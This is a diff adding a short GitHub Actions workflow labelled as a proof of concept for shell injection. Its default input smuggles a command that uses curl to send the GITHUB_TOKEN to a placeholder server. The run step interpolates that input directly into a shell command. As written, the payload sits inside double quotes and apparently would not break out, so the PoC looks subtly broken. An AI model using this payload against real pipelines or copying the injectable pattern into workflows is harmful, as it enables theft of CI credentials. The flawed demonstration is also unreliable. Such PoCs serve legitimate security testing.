@@ -1,0 +1,16 @@
+# .github/workflows/test-injection.yml
+name: PoC Shell Injection
+
+on:
+  workflow_dispatch:
+    inputs:
+      datasource:
+        description: "Test input"
+        required: true
+        default: "; curl https://your-server.com/capture?data=$GITHUB_TOKEN"
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ github.event.inputs.datasource }}"
